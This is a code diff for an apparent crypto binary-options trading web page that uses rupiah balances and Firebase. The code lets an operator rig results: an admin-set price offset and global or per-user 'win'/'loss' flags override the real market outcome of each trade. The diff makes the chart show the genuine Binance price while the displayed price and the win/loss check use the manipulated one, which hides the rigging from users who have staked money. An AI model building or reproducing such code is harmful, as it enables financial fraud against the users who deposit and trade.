@@ -13,20 +13,10 @@
         .bg-card { background: #0f0f0f; border: 1px solid #1a1a1a; }
         .gold-text { color: #f3ba2f; }
         .tab-active { background: #f3ba2f !important; color: #000 !important; font-weight: 800; border-color: #f3ba2f; }
-        
         #chart-container { position: relative; width: 100%; height: 45vh; background: #000; flex-shrink: 0; overflow: hidden; }
         canvas { width: 100%; height: 100%; display: block; }
-
-        .price-line {
-            position: absolute; right: 0; left: 0; height: 1px;
-            border-top: 1px dashed rgba(243, 186, 47, 0.4);
-            pointer-events: none; z-index: 10; transition: top 0.1s linear;
-        }
-        .price-tag {
-            position: absolute; right: 0; background: #f3ba2f; color: #000;
-            font-size: 10px; font-weight: 900; padding: 2px 8px;
-            border-radius: 4px 0 0 4px; transform: translateY(-50%);
-        }
+        .price-line { position: absolute; right: 0; left: 0; height: 1px; border-top: 1px dashed rgba(243, 186, 47, 0.4); pointer-events: none; z-index: 10; transition: top 0.1s linear; }
+        .price-tag { position: absolute; right: 0; background: #f3ba2f; color: #000; font-size: 10px; font-weight: 900; padding: 2px 8px; border-radius: 4px 0 0 4px; transform: translateY(-50%); }
         .scroll-v { overflow-y: auto; scrollbar-width: none; }
         .scroll-v::-webkit-scrollbar { display: none; }
     </style>
@@ -70,15 +60,14 @@
 
             <div class="flex gap-3">
                 <input type="number" id="trade-amt" placeholder="Nominal IDR" class="flex-grow bg-black border border-white/10 p-4 rounded-2xl outline-none font-black text-white text-sm focus:border-yellow-500 transition-all">
-                <button onclick="startTrade('UP')" class="bg-green-600 px-6 rounded-2xl font-black italic text-[11px] active:scale-95 transition-all">CALL</button>
-                <button onclick="startTrade('DOWN')" class="bg-red-600 px-6 rounded-2xl font-black italic text-[11px] active:scale-95 transition-all">PUT</button>
+                <button id="btn-up" onclick="startTrade('UP')" class="bg-green-600 px-6 rounded-2xl font-black italic text-[11px] active:scale-95 transition-all">CALL</button>
+                <button id="btn-down" onclick="startTrade('DOWN')" class="bg-red-600 px-6 rounded-2xl font-black italic text-[11px] active:scale-95 transition-all">PUT</button>
             </div>
         </div>
 
         <div class="px-6 flex-grow flex flex-col overflow-hidden">
             <p class="text-[9px] font-black text-gray-500 uppercase tracking-widest mb-3 border-b border-white/5 pb-2">Recent Trades</p>
-            <div id="trade-history" class="scroll-v flex-grow space-y-2 pb-6">
-                </div>
+            <div id="trade-history" class="scroll-v flex-grow space-y-2 pb-6"></div>
         </div>
     </div>
 
@@ -98,7 +87,7 @@
         const db = getFirestore(app);
         const auth = getAuth(app);
 
-        let balance = 0, uid = "", duration = 30, dataPoints = [], currentPrice = 0, adminOffset = 0, globalMode = "normal";
+        let balance = 0, uid = "", duration = 30, dataPoints = [], currentPrice = 0, realVisualPrice = 0, adminOffset = 0, globalMode = "normal";
         const canvas = document.getElementById('customChart');
         const ctx = canvas.getContext('2d');
 
@@ -111,8 +100,12 @@
         window.addEventListener('resize', initCanvas);
         initCanvas();
 
+        // Listen to Admin Setting
         onSnapshot(doc(db, "system", "market_control"), (s) => {
-            if(s.exists()){ adminOffset = s.data().offset || 0; globalMode = s.data().mode || "normal"; }
+            if(s.exists()){ 
+                adminOffset = s.data().offset || 0; 
+                globalMode = s.data().mode || "normal"; 
+            }
         });
 
         window.resetChart = () => { dataPoints = []; fetchPrice(); };
@@ -122,8 +115,13 @@
             try {
                 const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${coin}USDT`);
                 const d = await res.json();
-                currentPrice = parseFloat(d.price) + adminOffset;
-                if(dataPoints.length === 0) for(let i=0; i<60; i++) dataPoints.push(currentPrice);
+                
+                // Real Visual Price (untuk grafik mulus)
+                realVisualPrice = parseFloat(d.price);
+                // logic Price (untuk hasil win/loss & display teks)
+                currentPrice = realVisualPrice + adminOffset;
+
+                if(dataPoints.length === 0) for(let i=0; i<60; i++) dataPoints.push(realVisualPrice);
             } catch(e) {}
         }
         setInterval(fetchPrice, 1000);
@@ -133,37 +131,46 @@
             const w = canvas.width / window.devicePixelRatio;
             const h = canvas.height / window.devicePixelRatio;
 
-            dataPoints.push(currentPrice);
+            dataPoints.push(realVisualPrice);
             if(dataPoints.length > 60) dataPoints.shift();
 
             const min = Math.min(...dataPoints);
             const max = Math.max(...dataPoints);
-            const range = (max - min) || 2.0;
+            const range = (max - min) || 0.1;
 
             ctx.clearRect(0, 0, w, h);
-            ctx.beginPath(); ctx.moveTo(0, h);
+            
+            // Draw Area
+            ctx.beginPath();
+            ctx.moveTo(0, h);
             for(let i=0; i<dataPoints.length; i++) {
                 const x = (w / (dataPoints.length - 1)) * i;
                 const y = h - ((dataPoints[i] - min) / range) * (h * 0.7) - (h * 0.15);
                 ctx.lineTo(x, y);
                 if(i === dataPoints.length - 1) {
                     document.getElementById('price-line-el').style.top = y + 'px';
-                    document.getElementById('price-tag-el').innerText = dataPoints[i].toFixed(2);
-                    document.getElementById('current-price-display').innerText = "$" + dataPoints[i].toLocaleString();
+                    document.getElementById('price-tag-el').innerText = (dataPoints[i] + adminOffset).toFixed(2);
+                    document.getElementById('current-price-display').innerText = "$" + (dataPoints[i] + adminOffset).toLocaleString();
                 }
             }
             ctx.lineTo(w, h);
             const g = ctx.createLinearGradient(0, 0, 0, h);
-            g.addColorStop(0, 'rgba(243, 186, 47, 0.2)'); g.addColorStop(1, 'rgba(0,0,0,0)');
-            ctx.fillStyle = g; ctx.fill();
+            g.addColorStop(0, 'rgba(243, 186, 47, 0.2)');
+            g.addColorStop(1, 'rgba(0,0,0,0)');
+            ctx.fillStyle = g;
+            ctx.fill();
 
-            ctx.beginPath(); ctx.lineWidth = 2.5; ctx.strokeStyle = '#f3ba2f';
+            // Draw Line
+            ctx.beginPath();
+            ctx.lineWidth = 2.5;
+            ctx.strokeStyle = '#f3ba2f';
             for(let i=0; i<dataPoints.length; i++) {
                 const x = (w / (dataPoints.length - 1)) * i;
                 const y = h - ((dataPoints[i] - min) / range) * (h * 0.7) - (h * 0.15);
                 if(i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
             }
             ctx.stroke();
+
             requestAnimationFrame(drawChart);
         }
 
@@ -172,23 +179,31 @@
                 uid = u.uid;
                 const sel = document.getElementById('asset-selector');
                 Object.keys(APP_CONFIG.depositAddresses).forEach(c => {
-                    const o = document.createElement('option'); o.value = c; o.innerText = c + "/USDT"; sel.appendChild(o);
+                    const o = document.createElement('option');
+                    o.value = c; o.innerText = c + "/USDT";
+                    sel.appendChild(o);
                 });
                 fetchPrice().then(() => drawChart());
                 onSnapshot(doc(db, "users", uid), (s) => {
-                    if(s.exists()){ balance = s.data().balance; document.getElementById('user-bal').innerText = "Balance: Rp " + balance.toLocaleString(); }
+                    if(s.exists()){ 
+                        balance = s.data().balance; 
+                        document.getElementById('user-bal').innerText = "Balance: Rp " + balance.toLocaleString(); 
+                    }
                 });
-                // Load History
-                const q = query(collection(db, "users", uid, "transactions"), orderBy("timestamp", "desc"), limit(10));
-                onSnapshot(q, (snaps) => {
+
+                const qTrade = query(collection(db, "users", uid, "transactions"), orderBy("timestamp", "desc"), limit(10));
+                onSnapshot(qTrade, (snaps) => {
                     const hist = document.getElementById('trade-history');
                     hist.innerHTML = "";
                     snaps.forEach(d => {
                         const tr = d.data();
-                        hist.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl flex justify-between border border-white/5 items-center">
-                            <div><p class="text-[10px] font-black italic uppercase ${tr.status==='Win'?'text-green-500':tr.status==='Loss'?'text-red-500':'text-gray-500'}">${tr.title}</p></div>
-                            <p class="text-[11px] font-black">Rp ${tr.amount.toLocaleString()}</p>
-                        </div>`;
+                        if(tr.title.includes("Trade")) {
+                            hist.innerHTML += `
+                            <div class="bg-white/5 p-4 rounded-2xl flex justify-between border border-white/5 items-center">
+                                <div><p class="text-[10px] font-black italic uppercase ${tr.status==='Win'?'text-green-500':tr.status==='Loss'?'text-red-500':'text-gray-500'}">${tr.status} - ${tr.title}</p></div>
+                                <p class="text-[11px] font-black">Rp ${tr.amount.toLocaleString()}</p>
+                            </div>`;
+                        }
                     });
                 });
             } else { window.location.href = 'login.html'; }
@@ -196,18 +211,26 @@
 
         window.startTrade = async (side) => {
             const amt = parseInt(document.getElementById('trade-amt').value);
-            if(!amt || amt < 10000 || amt > balance) return alert("Cek saldo! Min Rp 10.000");
+            if(!amt || amt < 10000 || amt > balance) return alert("Cek saldo! Minimal Rp 10.000");
 
             const entryPrice = currentPrice;
-            document.querySelectorAll('button').forEach(b => b.disabled = true);
+            document.getElementById('btn-up').disabled = true;
+            document.getElementById('btn-down').disabled = true;
+
             await updateDoc(doc(db, "users", uid), { balance: increment(-amt) });
-            const tRef = await addDoc(collection(db, "users", uid, "transactions"), { title: `Trade ${side}`, amount: amt, status: "Pending", timestamp: serverTimestamp() });
+            const tRef = await addDoc(collection(db, "users", uid, "transactions"), { 
+                title: `Trade ${side}`, 
+                amount: amt, 
+                status: "Pending", 
+                timestamp: serverTimestamp() 
+            });
 
             setTimeout(async () => {
                 const userDoc = await getDoc(doc(db, "users", uid));
                 const force = userDoc.data().next_trade;
                 let win;
 
+                // Logic Win/Loss berdasarkan admin atau market asli
                 if(force === 'win' || globalMode === 'win') win = true;
                 else if(force === 'loss' || globalMode === 'loss') win = false;
                 else win = (side === 'UP' && currentPrice > entryPrice) || (side === 'DOWN' && currentPrice < entryPrice);
@@ -226,7 +249,8 @@
         };
 
         function showRes(st, msg, win) {
-            const o = document.getElementById('overlay'); o.classList.replace('hidden', 'flex');
+            const o = document.getElementById('overlay');
+            o.classList.replace('hidden', 'flex');
             document.getElementById('res-status').innerText = st;
             document.getElementById('res-status').className = `text-4xl font-black italic mb-2 ${win ? 'text-green-500' : 'text-red-500'}`;
             document.getElementById('res-detail').innerText = msg;
@@ -244,3 +268,5 @@
     </script>
 </body>
 </html>
+	
+
